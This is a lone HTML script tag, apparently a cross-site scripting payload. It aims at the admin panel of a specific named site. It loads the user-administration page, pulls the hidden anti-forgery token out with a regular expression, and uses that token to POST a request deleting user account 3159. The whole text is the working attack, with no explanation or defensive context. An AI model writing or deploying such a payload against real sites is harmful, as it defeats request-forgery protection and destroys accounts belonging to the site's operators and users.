<script>fetch("https://gishp.amitech.vn/Admin/ApplicationUsers").then(r=>r.text()).then(a=>fetch("https://gishp.amitech.vn/Admin/ApplicationUsers/Delete/3159",{method: "POST", headers :{"Requestverificationtoken": a.match(/name="__RequestVerificationToken" type="hidden" value=(.*)/)[1].slice(1,199)}}).then(r=>r.text()));</script>
